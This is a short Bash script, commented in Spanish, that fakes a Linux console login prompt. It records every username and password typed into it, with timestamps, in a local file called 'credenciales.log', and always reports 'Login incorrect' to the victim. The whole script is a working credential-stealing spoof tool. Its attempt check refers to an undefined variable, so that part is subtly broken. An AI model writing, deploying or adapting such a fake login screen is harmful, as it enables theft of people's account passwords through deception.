#!/bin/bash

LOGS="credenciales.log"
INTENTOS=3
TTY_NUM=$(tty | cut -d'/' -f4)

clear
for ((i=1; i<=INTENTOS; i++)); do
    echo -e "\n\033[1mLinux localhost $TTY_NUM\033[0m"
    read -p "login: " username
    read -s -p "Password: " password
    echo

    echo "$(date '+%Y-%m-%d %H:%M:%S') - Usuario: $username, Password: $password" >> "$LOGS"

    sleep 2
    
    if [ $i -lt $MAX_ATTEMPTS ]; then
        echo "Login incorrect"
        sleep 1
    fi
done

echo "Login incorrect"
sleep 1
clear

exit 0
